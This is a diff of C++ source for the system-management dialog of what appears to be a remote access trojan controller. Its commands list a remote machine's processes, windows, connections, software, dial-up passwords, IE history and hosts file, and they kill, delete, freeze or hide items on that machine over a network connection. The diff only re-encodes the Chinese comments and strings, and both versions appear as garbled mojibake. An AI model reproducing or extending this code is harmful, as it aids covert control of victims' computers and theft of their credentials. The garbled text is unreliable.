-		m_list_systeminfo.ShowWindow(SW_HIDE); //ç³»ç»Ÿä¿¡æ¯
-		m_list_process.ShowWindow(SW_HIDE);    //è¿›ç¨‹ç®¡ç†
-		m_list_windows.ShowWindow(SW_HIDE);    //çª—å£ç®¡ç†
-		m_list_netstate.ShowWindow(SW_HIDE);   //ç½‘ç»œè¿æ¥
-		m_list_software.ShowWindow(SW_HIDE);   //è½¯ä»¶ä¿¡æ¯
-		m_list_dialupass.ShowWindow(SW_SHOW);  //æ‹¨å·å¯†ç 
-		m_list_iehistory.ShowWindow(SW_HIDE);  //IEæµè§ˆè®°å½•
-		m_list_iefavorite.ShowWindow(SW_HIDE); //IEæ”¶è—å¤¹
-		m_edit_hosts.ShowWindow(SW_HIDE);      //Hostæ–‡ä»¶
+		m_list_systeminfo.ShowWindow(SW_HIDE); //ÏµÍ³ĞÅÏ¢
+		m_list_process.ShowWindow(SW_HIDE);    //½ø³Ì¹ÜÀí
+		m_list_windows.ShowWindow(SW_HIDE);    //´°¿Ú¹ÜÀí
+		m_list_netstate.ShowWindow(SW_HIDE);   //ÍøÂçÁ¬½Ó
+		m_list_software.ShowWindow(SW_HIDE);   //Èí¼şĞÅÏ¢
+		m_list_dialupass.ShowWindow(SW_SHOW);  //²¦ºÅÃÜÂë
+		m_list_iehistory.ShowWindow(SW_HIDE);  //IEä¯ÀÀ¼ÇÂ¼
+		m_list_iefavorite.ShowWindow(SW_HIDE); //IEÊÕ²Ø¼Ğ
+		m_edit_hosts.ShowWindow(SW_HIDE);      //HostÎÄ¼ş
 		
 		OnShowWindow(0);
 		if (m_list_dialupass.GetItemCount() == 0)
 			GetDialupassList();
 		break;
 	case 6:
-		m_list_systeminfo.ShowWindow(SW_HIDE); //ç³»ç»Ÿä¿¡æ¯
-		m_list_process.ShowWindow(SW_HIDE);    //è¿›ç¨‹ç®¡ç†
-		m_list_windows.ShowWindow(SW_HIDE);    //çª—å£ç®¡ç†
-		m_list_netstate.ShowWindow(SW_HIDE);   //ç½‘ç»œè¿æ¥
-		m_list_software.ShowWindow(SW_HIDE);   //è½¯ä»¶ä¿¡æ¯
-		m_list_dialupass.ShowWindow(SW_HIDE);  //æ‹¨å·å¯†ç 
-		m_list_iehistory.ShowWindow(SW_SHOW);  //IEæµè§ˆè®°å½•
-		m_list_iefavorite.ShowWindow(SW_HIDE); //IEæ”¶è—å¤¹
-		m_edit_hosts.ShowWindow(SW_HIDE);      //Hostæ–‡ä»¶
+		m_list_systeminfo.ShowWindow(SW_HIDE); //ÏµÍ³ĞÅÏ¢
+		m_list_process.ShowWindow(SW_HIDE);    //½ø³Ì¹ÜÀí
+		m_list_windows.ShowWindow(SW_HIDE);    //´°¿Ú¹ÜÀí
+		m_list_netstate.ShowWindow(SW_HIDE);   //ÍøÂçÁ¬½Ó
+		m_list_software.ShowWindow(SW_HIDE);   //Èí¼şĞÅÏ¢
+		m_list_dialupass.ShowWindow(SW_HIDE);  //²¦ºÅÃÜÂë
+		m_list_iehistory.ShowWindow(SW_SHOW);  //IEä¯ÀÀ¼ÇÂ¼
+		m_list_iefavorite.ShowWindow(SW_HIDE); //IEÊÕ²Ø¼Ğ
+		m_edit_hosts.ShowWindow(SW_HIDE);      //HostÎÄ¼ş
 		
 		OnShowWindow(0);
 		if (m_list_iehistory.GetItemCount() == 0)
 			GetIEhistoryList();
 		break;
 	case 7:
-		m_list_systeminfo.ShowWindow(SW_HIDE); //ç³»ç»Ÿä¿¡æ¯
-		m_list_process.ShowWindow(SW_HIDE);    //è¿›ç¨‹ç®¡ç†
-		m_list_windows.ShowWindow(SW_HIDE);    //çª—å£ç®¡ç†
-		m_list_netstate.ShowWindow(SW_HIDE);   //ç½‘ç»œè¿æ¥
-		m_list_software.ShowWindow(SW_HIDE);   //è½¯ä»¶ä¿¡æ¯
-		m_list_dialupass.ShowWindow(SW_HIDE);  //æ‹¨å·å¯†ç 
-		m_list_iehistory.ShowWindow(SW_HIDE);  //IEæµè§ˆè®°å½•
-		m_list_iefavorite.ShowWindow(SW_SHOW); //IEæ”¶è—å¤¹
-		m_edit_hosts.ShowWindow(SW_HIDE);      //Hostæ–‡ä»¶
+		m_list_systeminfo.ShowWindow(SW_HIDE); //ÏµÍ³ĞÅÏ¢
+		m_list_process.ShowWindow(SW_HIDE);    //½ø³Ì¹ÜÀí
+		m_list_windows.ShowWindow(SW_HIDE);    //´°¿Ú¹ÜÀí
+		m_list_netstate.ShowWindow(SW_HIDE);   //ÍøÂçÁ¬½Ó
+		m_list_software.ShowWindow(SW_HIDE);   //Èí¼şĞÅÏ¢
+		m_list_dialupass.ShowWindow(SW_HIDE);  //²¦ºÅÃÜÂë
+		m_list_iehistory.ShowWindow(SW_HIDE);  //IEä¯ÀÀ¼ÇÂ¼
+		m_list_iefavorite.ShowWindow(SW_SHOW); //IEÊÕ²Ø¼Ğ
+		m_edit_hosts.ShowWindow(SW_HIDE);      //HostÎÄ¼ş
 		
 		OnShowWindow(0);
 		if (m_list_iefavorite.GetItemCount() == 0)
 			GetFavoritesUrlList();
 		break;
 	case 8:
-		m_list_systeminfo.ShowWindow(SW_HIDE); //ç³»ç»Ÿä¿¡æ¯
-		m_list_process.ShowWindow(SW_HIDE);    //è¿›ç¨‹ç®¡ç†
-		m_list_windows.ShowWindow(SW_HIDE);    //çª—å£ç®¡ç†
-		m_list_netstate.ShowWindow(SW_HIDE);   //ç½‘ç»œè¿æ¥
-		m_list_software.ShowWindow(SW_HIDE);   //è½¯ä»¶ä¿¡æ¯
-		m_list_dialupass.ShowWindow(SW_HIDE);  //æ‹¨å·å¯†ç 
-		m_list_iehistory.ShowWindow(SW_HIDE);  //IEæµè§ˆè®°å½•
-		m_list_iefavorite.ShowWindow(SW_HIDE); //IEæ”¶è—å¤¹
-		m_edit_hosts.ShowWindow(SW_SHOW);      //Hostæ–‡ä»¶
+		m_list_systeminfo.ShowWindow(SW_HIDE); //ÏµÍ³ĞÅÏ¢
+		m_list_process.ShowWindow(SW_HIDE);    //½ø³Ì¹ÜÀí
+		m_list_windows.ShowWindow(SW_HIDE);    //´°¿Ú¹ÜÀí
+		m_list_netstate.ShowWindow(SW_HIDE);   //ÍøÂçÁ¬½Ó
+		m_list_software.ShowWindow(SW_HIDE);   //Èí¼şĞÅÏ¢
+		m_list_dialupass.ShowWindow(SW_HIDE);  //²¦ºÅÃÜÂë
+		m_list_iehistory.ShowWindow(SW_HIDE);  //IEä¯ÀÀ¼ÇÂ¼
+		m_list_iefavorite.ShowWindow(SW_HIDE); //IEÊÕ²Ø¼Ğ
+		m_edit_hosts.ShowWindow(SW_SHOW);      //HostÎÄ¼ş
 		
 		OnShowWindow(2);
 		if (m_edit_hosts.GetWindowTextLength() == 0)
@@ -783,7 +783,7 @@ void CSystemDlg::OnShowWindow(int Show)
 
 void CSystemDlg::OnNMRClickListProcess(NMHDR *pNMHDR, LRESULT *pResult)
 {
-	// TODO: åœ¨æ­¤æ·»åŠ æ§ä»¶é€šçŸ¥å¤„ç†ç¨‹åºä»£ç 
+	// TODO: ÔÚ´ËÌí¼Ó¿Ø¼şÍ¨Öª´¦Àí³ÌĞò´úÂë
 	CMenu	popup;
 	
 	if (m_list_process.IsWindowVisible())
@@ -795,19 +795,19 @@ void CSystemDlg::OnNMRClickListProcess(NMHDR *pNMHDR, LRESULT *pResult)
 	CPoint	p;
 	GetCursorPos(&p);
 	
-//	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this); //åŠ ä¸Šè¿™å¥æ²¡æœ‰å³é”®å›¾æ ‡
+//	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this); //¼ÓÉÏÕâ¾äÃ»ÓĞÓÒ¼üÍ¼±ê
 	CXTPCommandBars::TrackPopupMenu(pM,TPM_LEFTALIGN,p.x,p.y,this);
 	*pResult = 0;
 }
 
 void CSystemDlg::OnKillProcess() 
 {
-	KillProcessDel(COMMAND_KILLPROCESS,"");  //ç»“æŸè¿›ç¨‹
+	KillProcessDel(COMMAND_KILLPROCESS,"");  //½áÊø½ø³Ì
 }
 
 void CSystemDlg::OnKillDelete()
 {
-	KillProcessDel(COMMAND_KILLPROCESS,"å¹¶åˆ é™¤");  //ç»“æŸå¹¶åˆ é™¤è¿›ç¨‹
+	KillProcessDel(COMMAND_KILLPROCESS,"²¢É¾³ı");  //½áÊø²¢É¾³ı½ø³Ì
 }
 
 void CSystemDlg::KillProcessDel(BYTE Buffer ,char *strbuf) 
@@ -823,19 +823,19 @@ void CSystemDlg::KillProcessDel(BYTE Buffer ,char *strbuf)
 	lpBuffer[0] = Buffer;
 	
 	char *lpTips = 
-		"è­¦å‘Š: ç»ˆæ­¢è¿›ç¨‹ä¼šå¯¼è‡´ä¸å¸Œæœ›å‘ç”Ÿçš„ç»“æœï¼Œ\n"
-		"åŒ…æ‹¬æ•°æ®ä¸¢å¤±å’Œç³»ç»Ÿä¸ç¨³å®šã€‚åœ¨è¢«ç»ˆæ­¢å‰ï¼Œ\n"
-		"è¿›ç¨‹å°†æ²¡æœ‰æœºä¼šä¿å­˜å…¶çŠ¶æ€å’Œæ•°æ®ã€‚";
+		"¾¯¸æ: ÖÕÖ¹½ø³Ì»áµ¼ÖÂ²»Ï£Íû·¢ÉúµÄ½á¹û£¬\n"
+		"°üÀ¨Êı¾İ¶ªÊ§ºÍÏµÍ³²»ÎÈ¶¨¡£ÔÚ±»ÖÕÖ¹Ç°£¬\n"
+		"½ø³Ì½«Ã»ÓĞ»ú»á±£´æÆä×´Ì¬ºÍÊı¾İ¡£";
 	CString str;
 	if (pListCtrl->GetSelectedCount() > 1)
 	{
-		str.Format("%sç¡®å®\næƒ³ç»ˆæ­¢è¿™%dé¡¹è¿›ç¨‹å—?", lpTips, pListCtrl->GetSelectedCount());	
+		str.Format("%sÈ·Êµ\nÏëÖÕÖ¹Õâ%dÏî½ø³ÌÂğ?", lpTips, pListCtrl->GetSelectedCount());	
 	}
 	else
 	{
-		str.Format("%sç¡®å®\næƒ³ç»ˆæ­¢è¯¥é¡¹è¿›ç¨‹å—?", lpTips);
+		str.Format("%sÈ·Êµ\nÏëÖÕÖ¹¸ÃÏî½ø³ÌÂğ?", lpTips);
 	}
-	if (::MessageBox(m_hWnd, str, "è¿›ç¨‹ç»“æŸè­¦å‘Š", MB_YESNO|MB_ICONQUESTION) == IDNO)
+	if (::MessageBox(m_hWnd, str, "½ø³Ì½áÊø¾¯¸æ", MB_YESNO|MB_ICONQUESTION) == IDNO)
 		return;
 	
 	DWORD	dwOffset = 1;
@@ -868,19 +868,19 @@ void CSystemDlg::Onjiedong()
 	lpBuffer[0] = COMMAND_jiedong;
 	
 	char *lpTips = 
-		"è­¦å‘Š: ç»ˆæ­¢è¿›ç¨‹ä¼šå¯¼è‡´ä¸å¸Œæœ›å‘ç”Ÿçš„ç»“æœï¼Œ\n"
-		"åŒ…æ‹¬æ•°æ®ä¸¢å¤±å’Œç³»ç»Ÿä¸ç¨³å®šã€‚åœ¨è¢«ç»ˆæ­¢å‰ï¼Œ\n"
-		"è¿›ç¨‹å°†æ²¡æœ‰æœºä¼šä¿å­˜å…¶çŠ¶æ€å’Œæ•°æ®ã€‚";
+		"¾¯¸æ: ÖÕÖ¹½ø³Ì»áµ¼ÖÂ²»Ï£Íû·¢ÉúµÄ½á¹û£¬\n"
+		"°üÀ¨Êı¾İ¶ªÊ§ºÍÏµÍ³²»ÎÈ¶¨¡£ÔÚ±»ÖÕÖ¹Ç°£¬\n"
+		"½ø³Ì½«Ã»ÓĞ»ú»á±£´æÆä×´Ì¬ºÍÊı¾İ¡£";
 	CString str;
 	if (pListCtrl->GetSelectedCount() > 1)
 	{
-		str.Format("%sç¡®å®\næƒ³å†»ç»“è¿™%dé¡¹è¿›ç¨‹å—?", lpTips, pListCtrl->GetSelectedCount());	
+		str.Format("%sÈ·Êµ\nÏë¶³½áÕâ%dÏî½ø³ÌÂğ?", lpTips, pListCtrl->GetSelectedCount());	
 	}
 	else
 	{
-		str.Format("%sç¡®å®\næƒ³å†»ç»“è¯¥é¡¹è¿›ç¨‹å—?", lpTips);
+		str.Format("%sÈ·Êµ\nÏë¶³½á¸ÃÏî½ø³ÌÂğ?", lpTips);
 	}
-	//	if (::MessageBox(m_hWnd, str, "è¿›ç¨‹å†»ç»“è­¦å‘Š", MB_YESNO|MB_ICONQUESTION) == IDNO)
+	//	if (::MessageBox(m_hWnd, str, "½ø³Ì¶³½á¾¯¸æ", MB_YESNO|MB_ICONQUESTION) == IDNO)
 	//		return; 
 	
 	DWORD	dwOffset = 1;
@@ -912,19 +912,19 @@ void CSystemDlg::Ondongjie()
 	lpBuffer[0] = COMMAND_dongjie;
 	
 	char *lpTips = 
-		"è­¦å‘Š: ç»ˆæ­¢è¿›ç¨‹ä¼šå¯¼è‡´ä¸å¸Œæœ›å‘ç”Ÿçš„ç»“æœï¼Œ\n"
-		"åŒ…æ‹¬æ•°æ®ä¸¢å¤±å’Œç³»ç»Ÿä¸ç¨³å®šã€‚åœ¨è¢«ç»ˆæ­¢å‰ï¼Œ\n"
-		"è¿›ç¨‹å°†æ²¡æœ‰æœºä¼šä¿å­˜å…¶çŠ¶æ€å’Œæ•°æ®ã€‚";
+		"¾¯¸æ: ÖÕÖ¹½ø³Ì»áµ¼ÖÂ²»Ï£Íû·¢ÉúµÄ½á¹û£¬\n"
+		"°üÀ¨Êı¾İ¶ªÊ§ºÍÏµÍ³²»ÎÈ¶¨¡£ÔÚ±»ÖÕÖ¹Ç°£¬\n"
+		"½ø³Ì½«Ã»ÓĞ»ú»á±£´æÆä×´Ì¬ºÍÊı¾İ¡£";
 	CString str;
 	if (pListCtrl->GetSelectedCount() > 1)
 	{
-		str.Format("%sç¡®å®\næƒ³å†»ç»“è¿™%dé¡¹è¿›ç¨‹å—?", lpTips, pListCtrl->GetSelectedCount());	
+		str.Format("%sÈ·Êµ\nÏë¶³½áÕâ%dÏî½ø³ÌÂğ?", lpTips, pListCtrl->GetSelectedCount());	
 	}
 	else
 	{
-		str.Format("%sç¡®å®\næƒ³å†»ç»“è¯¥é¡¹è¿›ç¨‹å—?", lpTips);
+		str.Format("%sÈ·Êµ\nÏë¶³½á¸ÃÏî½ø³ÌÂğ?", lpTips);
 	}
-	//	if (::MessageBox(m_hWnd, str, "è¿›ç¨‹å†»ç»“è­¦å‘Š", MB_YESNO|MB_ICONQUESTION) == IDNO)
+	//	if (::MessageBox(m_hWnd, str, "½ø³Ì¶³½á¾¯¸æ", MB_YESNO|MB_ICONQUESTION) == IDNO)
 	//		return; 
 	
 	DWORD	dwOffset = 1;
@@ -991,13 +991,13 @@ void CSystemDlg::OnSelChangeTab(NMHDR* pNMHDR, LRESULT* pResult)
 
 void CSystemDlg::OnWindowReflush()
 {
-	// TODO: åœ¨æ­¤æ·»åŠ å‘½ä»¤å¤„ç†ç¨‹åºä»£ç 
+	// TODO: ÔÚ´ËÌí¼ÓÃüÁî´¦Àí³ÌĞò´úÂë
 	GetWindowsList();
 }
 
 void CSystemDlg::OnWindowClose()
 {
-	// TODO: åœ¨æ­¤æ·»åŠ å‘½ä»¤å¤„ç†ç¨‹åºä»£ç 
+	// TODO: ÔÚ´ËÌí¼ÓÃüÁî´¦Àí³ÌĞò´úÂë
 	BYTE lpMsgBuf[20];
 	CListCtrl	*pListCtrl = NULL;
 	pListCtrl = &m_list_windows;
@@ -1006,8 +1006,8 @@ void CSystemDlg::OnWindowClose()
 	if (nItem>=0)
 	{
 		ZeroMemory(lpMsgBuf,20);
-		lpMsgBuf[0]=COMMAND_WINDOW_CLOSE;      //æ³¨æ„è¿™ä¸ªå°±æ˜¯æˆ‘ä»¬çš„æ•°æ®å¤´
-		DWORD hwnd = pListCtrl->GetItemData(nItem); //å¾—åˆ°çª—å£çš„å¥æŸ„ä¸€åŒå‘é€
+		lpMsgBuf[0]=COMMAND_WINDOW_CLOSE;      //×¢ÒâÕâ¸ö¾ÍÊÇÎÒÃÇµÄÊı¾İÍ·
+		DWORD hwnd = pListCtrl->GetItemData(nItem); //µÃµ½´°¿ÚµÄ¾ä±úÒ»Í¬·¢ËÍ
 		memcpy(lpMsgBuf+1,&hwnd,sizeof(DWORD));
 		m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));
 	}
@@ -1015,7 +1015,7 @@ void CSystemDlg::OnWindowClose()
 
 void CSystemDlg::OnWindowHide()
 {
-	// TODO: åœ¨æ­¤æ·»åŠ å‘½ä»¤å¤„ç†ç¨‹åºä»£ç 
+	// TODO: ÔÚ´ËÌí¼ÓÃüÁî´¦Àí³ÌĞò´úÂë
 	BYTE lpMsgBuf[20];
 	CListCtrl	*pListCtrl = NULL;
 	pListCtrl = &m_list_windows;
@@ -1024,12 +1024,12 @@ void CSystemDlg::OnWindowHide()
 	if (nItem>=0)
 	{
 		ZeroMemory(lpMsgBuf,20);
-		lpMsgBuf[0]=COMMAND_WINDOW_TEST;       //çª—å£å¤„ç†æ•°æ®å¤´
-		DWORD hwnd = pListCtrl->GetItemData(nItem);  //å¾—åˆ°çª—å£çš„å¥æŸ„ä¸€åŒå‘é€
-		pListCtrl->SetItemText(nItem,2,"éšè—");  //æ³¨æ„è¿™æ—¶å°†åˆ—è¡¨ä¸­çš„æ˜¾ç¤ºçŠ¶æ€ä¸º"éšè—"
-		//è¿™æ ·åœ¨åˆ é™¤åˆ—è¡¨æ¡ç›®æ—¶å°±ä¸åˆ é™¤è¯¥é¡¹äº† å¦‚æœåˆ é™¤è¯¥é¡¹çª—å£å¥æŸ„ä¼šä¸¢å¤± å°±æ°¸è¿œä¹Ÿä¸èƒ½æ˜¾ç¤ºäº†
-		memcpy(lpMsgBuf+1,&hwnd,sizeof(DWORD));  //å¾—åˆ°çª—å£çš„å¥æŸ„ä¸€åŒå‘é€
-		DWORD dHow=SW_HIDE;               //çª—å£å¤„ç†å‚æ•° 0
+		lpMsgBuf[0]=COMMAND_WINDOW_TEST;       //´°¿Ú´¦ÀíÊı¾İÍ·
+		DWORD hwnd = pListCtrl->GetItemData(nItem);  //µÃµ½´°¿ÚµÄ¾ä±úÒ»Í¬·¢ËÍ
+		pListCtrl->SetItemText(nItem,2,"Òş²Ø");  //×¢ÒâÕâÊ±½«ÁĞ±íÖĞµÄÏÔÊ¾×´Ì¬Îª"Òş²Ø"
+		//ÕâÑùÔÚÉ¾³ıÁĞ±íÌõÄ¿Ê±¾Í²»É¾³ı¸ÃÏîÁË Èç¹ûÉ¾³ı¸ÃÏî´°¿Ú¾ä±ú»á¶ªÊ§ ¾ÍÓÀÔ¶Ò²²»ÄÜÏÔÊ¾ÁË
+		memcpy(lpMsgBuf+1,&hwnd,sizeof(DWORD));  //µÃµ½´°¿ÚµÄ¾ä±úÒ»Í¬·¢ËÍ
+		DWORD dHow=SW_HIDE;               //´°¿Ú´¦Àí²ÎÊı 0
 		memcpy(lpMsgBuf+1+sizeof(hwnd),&dHow,sizeof(DWORD));
 		m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));
 	}
@@ -1037,7 +1037,7 @@ void CSystemDlg::OnWindowHide()
 
 void CSystemDlg::OnWindowShow()
 {
-	// TODO: åœ¨æ­¤æ·»åŠ å‘½ä»¤å¤„ç†ç¨‹åºä»£ç 
+	// TODO: ÔÚ´ËÌí¼ÓÃüÁî´¦Àí³ÌĞò´úÂë
 	BYTE lpMsgBuf[20];
 	CListCtrl	*pListCtrl = NULL;
 	pListCtrl = &m_list_windows;
@@ -1048,7 +1048,7 @@ void CSystemDlg::OnWindowShow()
 		ZeroMemory(lpMsgBuf,20);
 		lpMsgBuf[0]=COMMAND_WINDOW_TEST;
 		DWORD hwnd = pListCtrl->GetItemData(nItem);
-		pListCtrl->SetItemText(nItem,2,"æ˜¾ç¤º");
+		pListCtrl->SetItemText(nItem,2,"ÏÔÊ¾");
 		memcpy(lpMsgBuf+1,&hwnd,sizeof(DWORD));
 		DWORD dHow=SW_RESTORE;
 		memcpy(lpMsgBuf+1+sizeof(hwnd),&dHow,sizeof(DWORD));
@@ -1058,7 +1058,7 @@ void CSystemDlg::OnWindowShow()
 
 void CSystemDlg::OnWindowMax()
 {
-	// TODO: åœ¨æ­¤æ·»åŠ å‘½ä»¤å¤„ç†ç¨‹åºä»£ç 
+	// TODO: ÔÚ´ËÌí¼ÓÃüÁî´¦Àí³ÌĞò´úÂë
 	BYTE lpMsgBuf[20];
 	CListCtrl	*pListCtrl = NULL;
 	pListCtrl = &m_list_windows;
@@ -1067,11 +1067,11 @@ void CSystemDlg::OnWindowMax()
 	if (nItem>=0)
 	{
 		ZeroMemory(lpMsgBuf,20);
-		lpMsgBuf[0]=COMMAND_WINDOW_TEST;     //åŒä¸Š
-		DWORD hwnd = pListCtrl->GetItemData(nItem);  //åŒä¸Š
-		pListCtrl->SetItemText(nItem,2,"æ˜¾ç¤º");   //å°†çŠ¶æ€æ”¹ä¸ºæ˜¾ç¤º
+		lpMsgBuf[0]=COMMAND_WINDOW_TEST;     //Í¬ÉÏ
+		DWORD hwnd = pListCtrl->GetItemData(nItem);  //Í¬ÉÏ
+		pListCtrl->SetItemText(nItem,2,"ÏÔÊ¾");   //½«×´Ì¬¸ÄÎªÏÔÊ¾
 		memcpy(lpMsgBuf+1,&hwnd,sizeof(DWORD));
-		DWORD dHow=SW_MAXIMIZE;     //åŒä¸Š
+		DWORD dHow=SW_MAXIMIZE;     //Í¬ÉÏ
 		memcpy(lpMsgBuf+1+sizeof(hwnd),&dHow,sizeof(DWORD));
 		m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));
 	}
@@ -1079,7 +1079,7 @@ void CSystemDlg::OnWindowMax()
 
 void CSystemDlg::OnWindowMin()
 {
-	// TODO: åœ¨æ­¤æ·»åŠ å‘½ä»¤å¤„ç†ç¨‹åºä»£ç 
+	// TODO: ÔÚ´ËÌí¼ÓÃüÁî´¦Àí³ÌĞò´úÂë
 	BYTE lpMsgBuf[20];
 	CListCtrl	*pListCtrl = NULL;
 	pListCtrl = &m_list_windows;
@@ -1090,7 +1090,7 @@ void CSystemDlg::OnWindowMin()
 		ZeroMemory(lpMsgBuf,20);
 		lpMsgBuf[0]=COMMAND_WINDOW_TEST;
 		DWORD hwnd = pListCtrl->GetItemData(nItem);
-		pListCtrl->SetItemText(nItem,2,"æ˜¾ç¤º");
+		pListCtrl->SetItemText(nItem,2,"ÏÔÊ¾");
 		memcpy(lpMsgBuf+1,&hwnd,sizeof(DWORD));
 		DWORD dHow=SW_MINIMIZE;
 		memcpy(lpMsgBuf+1+sizeof(hwnd),&dHow,sizeof(DWORD));
@@ -1309,7 +1309,7 @@ void CSystemDlg::OnRclickList1(NMHDR* pNMHDR, LRESULT* pResult)
 		break;
 	}
 	
-//	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this); //åŠ ä¸Šè¿™å¥æ²¡æœ‰å³é”®å›¾æ ‡
+//	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this); //¼ÓÉÏÕâ¾äÃ»ÓĞÓÒ¼üÍ¼±ê
 	CXTPCommandBars::TrackPopupMenu(pM, 0, p.x, p.y, this);
 	*pResult = 0;
 }
@@ -1406,7 +1406,7 @@ void CSystemDlg::OnMenuitem40016()
 		Data += "\r\n";
 	}
 	SetClipboardText(Data);
-	MessageBox("å·²å¤åˆ¶æ•°æ®åˆ°å‰ªåˆ‡æ¿", NULL, MB_ICONINFORMATION);
+	MessageBox("ÒÑ¸´ÖÆÊı¾İµ½¼ôÇĞ°å", NULL, MB_ICONINFORMATION);
 }
 
 void CSystemDlg::OnMenuitem40017() 
@@ -1417,7 +1417,7 @@ void CSystemDlg::OnMenuitem40017()
 		return ;	
 	}
 	
-	if (MessageBox(_T("ç¡®å®šè¦å¸è½½è¯¥ç¨‹åº?"), _T("æç¤º"), MB_YESNO | MB_ICONQUESTION) == IDNO)
+	if (MessageBox(_T("È·¶¨ÒªĞ¶ÔØ¸Ã³ÌĞò?"), _T("ÌáÊ¾"), MB_YESNO | MB_ICONQUESTION) == IDNO)
 		return;
 	
 	POSITION pos = m_list_software.GetFirstSelectedItemPosition();
@@ -1485,13 +1485,13 @@ void CSystemDlg::OnMenuitem40018()
 void CSystemDlg::OnMenuitem40019() 
 {
 	// TODO: Add your command handler code here
-	KillProcessDel(COMMAND_KILLPROCESS,"");  //ç»“æŸè¿›ç¨‹
+	KillProcessDel(COMMAND_KILLPROCESS,"");  //½áÊø½ø³Ì
 }
 
 void CSystemDlg::OnMenuitem40020() 
 {
 	// TODO: Add your command handler code here
-	KillProcessDel(COMMAND_KILLPROCESS,"å¹¶åˆ é™¤");  //ç»“æŸå¹¶åˆ é™¤è¿›ç¨‹
+	KillProcessDel(COMMAND_KILLPROCESS,"²¢É¾³ı");  //½áÊø²¢É¾³ı½ø³Ì
 }
 
 void CSystemDlg::PostNcDestroy() 
